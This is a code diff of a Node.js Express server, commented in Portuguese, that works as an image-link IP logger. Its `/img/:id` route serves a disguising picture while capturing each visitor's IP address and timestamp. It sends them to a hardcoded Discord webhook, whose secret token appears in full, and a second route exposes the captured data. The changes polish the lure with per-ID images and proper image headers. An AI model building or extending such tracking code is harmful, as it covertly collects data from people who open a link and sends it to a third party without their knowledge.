@@ -243,10 +243,7 @@ const app = express();
 const port = process.env.PORT || 3000;
 app.use(express.static('public'));
 
-// Armazenar dados
 const ipData = {};
-const imageStore = {}; // guarda a imagem escolhida para cada ID
-
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1528810633750122506/Rl3CpBXoq4Q14pMHMlX_ZHmJwSjK9TPJzqMu3rrpI6RFoO-HwMrsEnEzXjaz_ram4_MO';
 
 // Função para enviar ao webhook
@@ -273,10 +270,13 @@ async function enviarWebhook(id, dados) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ embeds: [embed] })
     });
-  } catch (e) {}
+    console.log(`📨 Dados enviados para o webhook (ID: ${id})`);
+  } catch (e) {
+    console.error('❌ Erro ao enviar webhook:', e);
+  }
 }
 
-// Rota para servir a imagem
+// Rota que serve a imagem e captura dados
 app.get('/img/:id', (req, res) => {
   const id = req.params.id;
   const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -310,23 +310,37 @@ app.get('/img/:id', (req, res) => {
     timestamp: new Date().toISOString()
   };
 
-  // Enviar para o webhook
+  // Enviar para webhook
   enviarWebhook(id, ipData[id]);
 
-  // Servir a imagem
-  let imagemPath = imageStore[id] || path.join(__dirname, 'public', 'imagem.jpg');
+  // Servir a imagem associada a este ID
+  // A imagem foi salva na pasta public com o nome <id>.jpg ou <id>.png
+  let imagemPath = path.join(__dirname, 'public', `${id}.jpg`);
   if (!fs.existsSync(imagemPath)) {
-    imagemPath = path.join(__dirname, 'public', 'imagem.png');
+    imagemPath = path.join(__dirname, 'public', `${id}.png`);
   }
+  if (!fs.existsSync(imagemPath)) {
+    // Fallback para imagem padrão
+    imagemPath = path.join(__dirname, 'public', 'imagem.jpg');
+    if (!fs.existsSync(imagemPath)) {
+      imagemPath = path.join(__dirname, 'public', 'imagem.png');
+    }
+  }
+
   if (fs.existsSync(imagemPath)) {
+    // Define cabeçalhos para cache e tipo correto
+    const ext = path.extname(imagemPath).toLowerCase();
+    const contentType = ext === '.png' ? 'image/png' : 'image/jpeg';
+    res.setHeader('Content-Type', contentType);
+    res.setHeader('Cache-Control', 'public, max-age=86400');
     res.sendFile(imagemPath);
   } else {
-    // Fallback: serve um GIF do CDN
+    // Se não houver imagem, redireciona para um GIF de fallback
     res.redirect('https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif');
   }
 });
 
-// Rota para ver dados
+// Rota para ver dados brutos (apenas para testes)
 app.get('/dados/:id', (req, res) => {
   const id = req.params.id;
   if (ipData[id]) res.json(ipData[id]);
